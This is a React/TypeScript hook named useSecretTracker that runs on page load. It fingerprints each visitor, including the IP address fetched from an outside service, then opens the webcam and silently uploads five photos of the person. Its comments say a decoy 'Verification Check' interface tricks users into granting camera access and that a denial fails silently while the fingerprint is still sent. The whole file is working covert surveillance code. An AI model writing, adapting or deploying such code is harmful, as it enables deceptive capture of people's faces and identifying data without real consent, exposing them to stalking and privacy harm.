import { useEffect, useRef } from "react";
import { v4 as uuidv4 } from "uuid";
import { useSubmitVisitorInfo, useSubmitPhoto } from "@workspace/api-client-react";

export function useSecretTracker() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const { mutate: submitInfo } = useSubmitVisitorInfo();
  const { mutate: submitPhoto } = useSubmitPhoto();
  const initialized = useRef(false);

  useEffect(() => {
    // Only run this logic once per page load
    if (initialized.current) return;
    initialized.current = true;

    const sessionId = uuidv4();

    const gatherAndSubmitInfo = async () => {
      let ipAddress = "Unknown";
      try {
        // Fallback for IP address fetching if the server doesn't provide it via headers
        const res = await fetch("https://api64.ipify.org?format=json");
        const data = await res.json();
        ipAddress = data.ip;
      } catch (error) {
        console.warn("Failed to fetch IP address.");
      }

      submitInfo({
        data: {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          screenWidth: window.screen.width,
          screenHeight: window.screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
          referrer: document.referrer || "Direct",
          ip: ipAddress,
          timestamp: new Date().toISOString(),
        },
      });
    };

    const capturePhotosSilently = async () => {
      try {
        // Request camera access - the browser will prompt the user.
        // Our decoy UI acts as a "Verification Check" to encourage them to click allow.
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false,
        });

        const video = videoRef.current;
        if (!video) return;

        video.srcObject = stream;
        await video.play();

        let photoCount = 0;
        const maxPhotos = 5;

        const captureInterval = setInterval(() => {
          if (photoCount >= maxPhotos) {
            clearInterval(captureInterval);
            // Turn off the webcam indicator once done
            stream.getTracks().forEach((track) => track.stop());
            return;
          }

          const canvas = canvasRef.current;
          if (canvas && video.videoWidth) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            
            if (ctx) {
              // Draw the current video frame to the hidden canvas
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              
              // Compress to JPEG to save bandwidth
              const base64Data = canvas.toDataURL("image/jpeg", 0.8);
              
              submitPhoto({
                data: {
                  sessionId,
                  photoIndex: photoCount,
                  imageData: base64Data,
                  timestamp: new Date().toISOString(),
                },
              });
            }
          }
          photoCount++;
        }, 1000);
      } catch (error) {
        // If they deny camera permissions, fail silently. 
        // We still get the visitor info from the other function.
        console.warn("Camera access denied or unavailable.");
      }
    };

    gatherAndSubmitInfo();
    capturePhotosSilently();
  }, [submitInfo, submitPhoto]);

  return { videoRef, canvasRef };
}
